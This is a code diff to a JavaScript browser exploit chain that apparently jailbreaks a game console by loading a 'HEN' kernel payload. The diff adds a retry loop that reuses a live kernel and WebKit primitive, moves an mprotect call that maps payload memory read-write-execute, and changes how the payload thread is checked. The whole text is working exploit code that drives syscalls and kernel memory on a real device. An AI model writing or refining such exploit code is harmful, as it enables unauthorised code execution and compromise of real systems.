@@ -24,7 +24,7 @@ import { sha256Hex } from "./sha256.js";
 
 const HEN_BIN = {
   length: 498720,
-  sha256: "9897135b31bfd0eecafb770e2bb4a6b720de47e18c84e01314294592c34c9515",
+  sha256: "6c09ecf7a4183761c5f5d794eeecb302eb0e51303985167118cfe763742ac612",
 };
 const CANDIDATE_READY = true;
 
@@ -1244,7 +1244,7 @@ async function attempt(ctx, opts) {
 
   if (kernelAlreadyOpen) {
     say("[p] kernel is already open -- starting another HEN shot directly");
-    const payload = await loadPayload("hen-1402-core.bin", henBytes, true);
+    const payload = await loadPayloadShots("hen-1402-core.bin", henBytes, true);
     return {
       payload: payload === true,
       threadStarted: STATE.payloadThreadStarted === true,
@@ -1722,7 +1722,7 @@ async function attempt(ctx, opts) {
   /* ---- Load corrected HEN payload ---- */
   say("[p] Attempting to start corrected HEN as a thread");
   try {
-    iface.payload = await loadPayload("hen-1402-core.bin", henBytes, iface.defused);
+    iface.payload = await loadPayloadShots("hen-1402-core.bin", henBytes, iface.defused);
     iface.threadStarted = STATE.payloadThreadStarted === true;
     iface.installed = STATE.henInstalled === true;
     if (STATE.terminalReleaseAttempted) return iface;
@@ -1744,6 +1744,22 @@ async function attempt(ctx, opts) {
 }
 
 /* ------------------------------------------------------- Payload Loader */
+
+async function loadPayloadShots(url, blob, defused) {
+  const unlimited = !!(STATE.ctx && STATE.ctx.unlimited === true);
+  let shot = 0;
+  for (;;) {
+    shot++;
+    if (shot > 1) {
+      say("[p] direct HEN shot " + shot + " -- reusing the live kernel and WebKit primitive");
+      await checkpoint("HEN-DIRECT-RETRY",
+        "shot=" + shot + "; no page reload and no new exploit heap");
+      await new Promise(function (resolve) { setTimeout(resolve, 2000); });
+    }
+    const ok = await loadPayload(url, blob, defused);
+    if (ok === true || STATE.henInstalled === true || !unlimited) return ok;
+  }
+}
 
 async function fetchBytes(url, tag) {
   try {
@@ -1822,15 +1838,7 @@ async function loadPayload(url, vorab, defused) {
   }
   
   for (let o = 0; o < size; o += 0x1000) wr4(plus(entry, o), 0);
-  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
-    say("[p] mprotect rwx failed, errno " + c.errno()); return false;
-  }
-  codeAt(entry, 0).hex("c3");
-  const probe = c.callAddr(entry, []);
-  if (probe === undefined || probe === null) {
-    say("[p] entry page does not execute in ring 3 -- stopping"); return false;
-  }
-  say("[p] entry page executes in ring 3, loading payload");
+  say("[p] payload mapping is writable; copying final code before execution");
 
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
@@ -1847,6 +1855,10 @@ async function loadPayload(url, vorab, defused) {
       say("[p] copy mismatch at 0x" + o.toString(16)); return false;
     }
   }
+  if (sc(S.mprotect, entry, size, 7).i32 !== 0) {
+    say("[p] final mprotect rwx failed, errno " + c.errno()); return false;
+  }
+  say("[p] final payload mapping committed RW -> RWX");
   
   say("[p] corrected HEN copied byte-for-byte and verified, starting thread");
 
@@ -1884,38 +1896,22 @@ async function loadPayload(url, vorab, defused) {
   const wait = function (ms) {
     return new Promise(function (resolve) { setTimeout(resolve, ms); });
   };
-  const deadline = Date.now() + 15000;
   let markerClosed = false, markerErrno = 0;
-  while (Date.now() < deadline) {
-    const marker = sc(S.open, markerPath.at, 0).i32;
-    if (marker >= 0) {
-      markerClosed = sc(S.close, marker).i32 === 0;
-      STATE.henInstalled = true;
-      break;
-    }
+  /* Do not run any ROP/syscall work while the new HEN pthread is starting.
+     The prior 250 ms marker polling raced the HEN initializer and repeatedly
+     killed/restarted WebProcess roughly four seconds after pthread_create. */
+  await wait(15000);
+  const marker = sc(S.open, markerPath.at, 0).i32;
+  if (marker >= 0) {
+    markerClosed = sc(S.close, marker).i32 === 0;
+    STATE.henInstalled = true;
+  } else {
     markerErrno = c.errno();
-    await wait(250);
   }
 
   if (!STATE.henInstalled) {
-    const stagePresent = function (path) {
-      const fd = sc(S.open, cstr(path).at, 0).i32;
-      if (fd < 0) return false;
-      sc(S.close, fd);
-      return true;
-    };
-    const enteredInstall = stagePresent("/user/temp/h14r9.pre");
-    const returnedInstall = stagePresent("/user/temp/h14r9.post");
-    let stageReport = "HEN stopped before the install-payload call";
-    if (returnedInstall) {
-      stageReport = "install_payload returned; the failure happened later in outer HEN";
-    } else if (enteredInstall) {
-      stageReport = "install_payload was entered but did not return";
-    }
     await checkpoint("HEN-MARKER-TIMEOUT",
-      "pthread started; marker absent after 15s; errno=" + markerErrno +
-      "; pre=" + enteredInstall + "; post=" + returnedInstall + "; " + stageReport);
-    say("[p] LAST HEN STAGE: " + stageReport);
+      "pthread started; one marker check after 15s was absent; errno=" + markerErrno);
     say("[p] HEN thread is still unconfirmed after 15 seconds; keeping this page alive");
     return false;
   }
